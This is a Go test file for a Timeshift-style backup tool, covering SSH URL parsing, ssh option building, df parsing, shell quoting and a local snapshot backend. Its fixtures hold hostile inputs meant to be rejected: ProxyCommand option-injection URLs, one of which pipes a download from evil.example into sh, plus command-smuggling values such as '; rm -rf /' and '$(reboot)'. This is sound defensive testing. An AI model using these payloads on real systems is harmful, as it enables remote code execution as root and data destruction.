package timeshift

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// This is a security control, not tidiness: the host and user reach ssh as
// arguments, and a value beginning with "-" is parsed as an OPTION -- so
// ssh://-oProxyCommand=.../path runs an arbitrary command as root.
func TestParseURLRejectsOptionInjection(t *testing.T) {
	hostile := []string{
		"ssh://-oProxyCommand=curl evil.example/x|sh@host/path",
		"ssh://-oProxyCommand=touch+pwned/srv/snap",
		"-oProxyCommand=id:/srv/snap",
		"ssh://user@-oProxyCommand=id/srv/snap",
		"ssh://-J attacker/srv/snap",
	}
	for _, url := range hostile {
		if _, host, _, _, err := ParseURL(url); err == nil {
			t.Errorf("ParseURL(%q) accepted a host that ssh would read as an option: %q", url, host)
		}
	}
}

func TestParseURLRejectsMalformed(t *testing.T) {
	bad := []string{
		"",
		"nocolon",
		"ssh://host",            // no path
		"host:relative/path",    // path must be absolute
		"ssh://host/",           // path is "/" -- accepted, see below
		"ssh://:22/srv",         // no host
		"user@:/srv",            // no host
		"ssh://ho st/srv",       // space in host
		"ssh://host;reboot/srv", // shell metacharacter
	}
	for _, url := range bad {
		_, _, _, _, err := ParseURL(url)
		if url == "ssh://host/" {
			// "/" is a legitimate absolute path; the Vala parser accepts it too.
			if err != nil {
				t.Errorf("ParseURL(%q) should accept a root path", url)
			}
			continue
		}
		if err == nil {
			t.Errorf("ParseURL(%q) should have been rejected", url)
		}
	}
}

func TestParseURLForms(t *testing.T) {
	cases := []struct {
		url  string
		user string
		host string
		port int
		path string
	}{
		{"backup@backup.example:/srv/timeshift", "backup", "backup.example", 22, "/srv/timeshift"},
		{"backup.example:/srv", "", "backup.example", 22, "/srv"},
		{"ssh://backup@backup.example/srv/timeshift", "backup", "backup.example", 22, "/srv/timeshift"},
		{"ssh://backup@backup.example:2222/srv", "backup", "backup.example", 2222, "/srv"},
		{"ssh://backup.example:2222/srv", "", "backup.example", 2222, "/srv"},
		{"  backup@host:/p  ", "backup", "host", 22, "/p"},
		// The scp-like form splits at the FIRST colon, so a path may contain one.
		{"backup@host:/srv/a:b", "backup", "host", 22, "/srv/a:b"},
		{"192.168.1.10:/srv", "", "192.168.1.10", 22, "/srv"},
	}
	for _, c := range cases {
		user, host, port, p, err := ParseURL(c.url)
		if err != nil {
			t.Errorf("ParseURL(%q): %v", c.url, err)
			continue
		}
		if user != c.user || host != c.host || port != c.port || p != c.path {
			t.Errorf("ParseURL(%q) = (%q,%q,%d,%q), want (%q,%q,%d,%q)",
				c.url, user, host, port, p, c.user, c.host, c.port, c.path)
		}
	}
}

// IPv6 is rejected rather than mis-parsed: the bracket form confuses the
// host:port split, and connecting to the wrong host silently is worse than
// refusing.
func TestParseURLRejectsIPv6(t *testing.T) {
	for _, url := range []string{"ssh://[fe80::1]/srv", "[fe80::1]:/srv", "fe80::1:/srv"} {
		if _, _, _, _, err := ParseURL(url); err == nil {
			t.Errorf("ParseURL(%q) accepted an IPv6 literal", url)
		}
	}
}

func TestSSHOptions(t *testing.T) {
	b := &SSHBackend{Host: "h", User: "u", Port: 22, KeyFile: "/etc/timeshift/ssh/id_ed25519"}
	opts := strings.Join(b.SSHOptions(false, false), " ")

	for _, want := range []string{
		"-o BatchMode=yes",
		"-o ConnectTimeout=10",
		"-o ServerAliveInterval=15",
		"-o IdentitiesOnly=yes",
		"-F /dev/null",
		"-o UserKnownHostsFile=" + KnownHostsFile(),
		"-i /etc/timeshift/ssh/id_ed25519",
		"-n",
	} {
		if !strings.Contains(opts, want) {
			t.Errorf("options missing %q:\n%s", want, opts)
		}
	}
	// Port 22 is the default and is not passed.
	if strings.Contains(opts, "-p ") {
		t.Errorf("port 22 should not be passed explicitly: %s", opts)
	}

	// -n stops ssh eating Timeshift's stdin, but must be omitted when the
	// caller is piping data in -- it would silently write an empty file.
	if strings.Contains(strings.Join(b.SSHOptions(true, false), " "), " -n ") {
		t.Error("-n must be omitted when stdin is in use")
	}

	b.Port = 2222
	if !strings.Contains(strings.Join(b.SSHOptions(false, false), " "), "-p 2222") {
		t.Error("a non-default port must be passed")
	}
}

// A client attaching to a wedged master over its unix socket never calls
// connect(2), so ConnectTimeout does not apply and it blocks forever. noMux is
// what the reachability probe uses to escape that.
func TestSSHOptionsMultiplexing(t *testing.T) {
	b := &SSHBackend{Host: "h", ControlPath: "/run/timeshift/ssh-abc"}

	mux := strings.Join(b.SSHOptions(false, false), " ")
	if !strings.Contains(mux, "ControlMaster=auto") || !strings.Contains(mux, "ControlPersist=60") {
		t.Errorf("multiplexing not configured: %s", mux)
	}

	noMux := strings.Join(b.SSHOptions(false, true), " ")
	if !strings.Contains(noMux, "ControlMaster=no") || !strings.Contains(noMux, "ControlPath=none") {
		t.Errorf("noMux did not disable multiplexing: %s", noMux)
	}
	if strings.Contains(noMux, "ControlPersist") {
		t.Errorf("noMux must not keep a master alive: %s", noMux)
	}
}

func TestParseDFLine(t *testing.T) {
	out := "Filesystem     1B-blocks         Used    Available Use% Mounted on\n" +
		"/dev/nvme0n1p2 489997189120 54442164224 410589323264  12% /\n"
	size, used, avail, err := parseDFLine(out)
	if err != nil {
		t.Fatal(err)
	}
	if size != 489997189120 || used != 54442164224 || avail != 410589323264 {
		t.Errorf("got %d/%d/%d", size, used, avail)
	}
}

// df wraps a long device name onto its own line, which moves the figures.
func TestParseDFLineWrapped(t *testing.T) {
	out := "Filesystem 1B-blocks Used Available Use% Mounted on\n" +
		"/dev/mapper/a-very-long-volume-group-name-indeed\n" +
		"           1000000000 400000000 600000000  40% /srv\n"
	size, used, avail, err := parseDFLine(out)
	if err != nil {
		t.Fatal(err)
	}
	if size != 1000000000 || used != 400000000 || avail != 600000000 {
		t.Errorf("got %d/%d/%d from a wrapped row", size, used, avail)
	}
}

func TestParseDFLineGarbage(t *testing.T) {
	if _, _, _, err := parseDFLine(""); err == nil {
		t.Error("empty df output must be an error")
	}
	if _, _, _, err := parseDFLine("only a header\n"); err == nil {
		t.Error("a header with no data row must be an error")
	}
}

// The delimited batch is what turns 250 round trips into one.
func TestParseControlBatch(t *testing.T) {
	/* What the remote actually sends: a marker line, the file verbatim, then
	 * one echo. Snapshot b is missing its info.json, so the remote emits no
	 * marker for it at all. */
	out := controlDelimiter + "/snap/a\x01info.json\n" +
		"{\"created\":\"1\"}\n" +
		"\n" +
		controlDelimiter + "/snap/a\x01exclude.list\n" +
		"/root/**\n" +
		"/home/*/.cache\n" +
		"\n"

	files := parseControlBatch(out)

	// The file's own trailing newline survives; only the echo's is stripped.
	if got := files["/snap/a\x00info.json"]; got != "{\"created\":\"1\"}\n" {
		t.Errorf("info.json = %q", got)
	}
	if got := files["/snap/a\x00exclude.list"]; got != "/root/**\n/home/*/.cache\n" {
		t.Errorf("exclude.list = %q", got)
	}
	if _, ok := files["/snap/b\x00info.json"]; ok {
		t.Error("a file the remote never emitted must be absent from the map")
	}

	// A file that genuinely holds one newline must stay distinguishable from
	// one that does not exist -- which is why the remote emits no marker at all
	// for a missing file rather than an empty section.
	single := parseControlBatch(controlDelimiter + "/snap/c\x01empty\n\n\n")
	if got, ok := single["/snap/c\x00empty"]; !ok || got != "\n" {
		t.Errorf("a one-newline file came back as (%q, present=%v)", got, ok)
	}
}

func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		"/srv/snap":  `'/srv/snap'`,
		"it's":       `'it'\''s'`,
		"$(reboot)":  `'$(reboot)'`,
		"a b":        `'a b'`,
		"; rm -rf /": `'; rm -rf /'`,
		"`id`":       "'`id`'",
	}
	for in, want := range cases {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %q, want %q", in, got, want)
		}
	}
}

// ------------------------------------------------------------ local fs ----

func TestLocalBackend(t *testing.T) {
	dir := t.TempDir()
	snapA := filepath.Join(dir, "2026-08-30_21-45-59")
	snapB := filepath.Join(dir, "2026-08-31_08-03-01")
	os.MkdirAll(snapA, 0755)
	os.MkdirAll(snapB, 0755)
	os.WriteFile(filepath.Join(snapA, "info.json"), []byte(`{"created":"1"}`), 0644)
	os.WriteFile(filepath.Join(dir, "not-a-dir"), []byte("x"), 0644)

	b := &LocalBackend{Name: "test"}
	ctx := context.Background()

	if b.IsRemote() || b.TypeID() != "local" {
		t.Error("local backend misreports itself")
	}

	subs, err := b.ListSubdirs(ctx, dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(subs) != 2 {
		t.Errorf("ListSubdirs = %v, want the two snapshot dirs only", subs)
	}

	// A missing directory must be an error, never an empty listing: an empty
	// listing is indistinguishable from "no snapshots", and that is how a
	// repository gets pruned to nothing.
	if _, err := b.ListSubdirs(ctx, filepath.Join(dir, "absent")); err == nil {
		t.Error("listing a missing directory must be an error")
	}

	if !b.DirExists(ctx, snapA) || b.DirExists(ctx, filepath.Join(dir, "absent")) {
		t.Error("DirExists is wrong")
	}
	if !b.FileExists(ctx, filepath.Join(snapA, "info.json")) || b.FileExists(ctx, snapA) {
		t.Error("FileExists is wrong")
	}

	files, err := b.ReadControlFiles(ctx, []string{snapA, snapB}, []string{"info.json", "exclude.list"})
	if err != nil {
		t.Fatal(err)
	}
	if got := files[snapA+"\x00info.json"]; got != `{"created":"1"}` {
		t.Errorf("prefetched info.json = %q", got)
	}
	if _, ok := files[snapB+"\x00info.json"]; ok {
		t.Error("a file that does not exist must not appear in the result")
	}
}

/* An rsync transport must never carry -n.
 *
 * SSHOptions adds -n when nothing will write to ssh's stdin, which stops ssh
 * swallowing the caller's stdin on an ordinary `ssh host command`. For rsync's
 * -e, stdin IS the channel rsync uses to talk to the remote: with -n the remote
 * rsync receives nothing and exits, and both ends report
 *
 *   rsync: connection unexpectedly closed (0 bytes received so far)
 *   rsync error: error in rsync protocol data stream (code 12)
 *
 * which reads like a network fault and is not one. Nothing caught this because
 * the write path had only ever been exercised against a LOCAL repository, where
 * there is no ssh at all.
 */
func TestAnRsyncTransportNeverCarriesDashN(t *testing.T) {
	repo := &Repo{Backend: &SSHBackend{
		User: "backup", Host: "nas.example", Path: "/srv/snap",
		KeyFile: "/etc/timeshift/ssh/id_ed25519",
	}}

	rsh := repo.RsyncRSH()
	if rsh == "" {
		t.Fatal("no RSH for a remote repository")
	}
	for _, f := range strings.Fields(rsh) {
		if f == "-n" {
			t.Fatalf("the rsync transport carries -n, which sends the remote nothing:\n  %s", rsh)
		}
	}

	// And it must still carry the options that make it safe and non-interactive.
	for _, want := range []string{"BatchMode=yes", "IdentitiesOnly=yes", "-F", "/dev/null"} {
		if !strings.Contains(rsh, want) {
			t.Errorf("the rsync transport is missing %q:\n  %s", want, rsh)
		}
	}
}

/* The reverse: a plain `ssh host command` SHOULD carry -n, so ssh does not
 * consume the stdin of whatever invoked us. */
func TestAPlainCommandTransportStillCarriesDashN(t *testing.T) {
	b := &SSHBackend{User: "backup", Host: "nas.example", Path: "/srv/snap"}
	opts := strings.Join(b.SSHOptions(false, false), " ")
	if !strings.Contains(opts, " -n ") && !strings.HasSuffix(opts, " -n") {
		t.Errorf("a command transport lost -n:\n  %s", opts)
	}
}
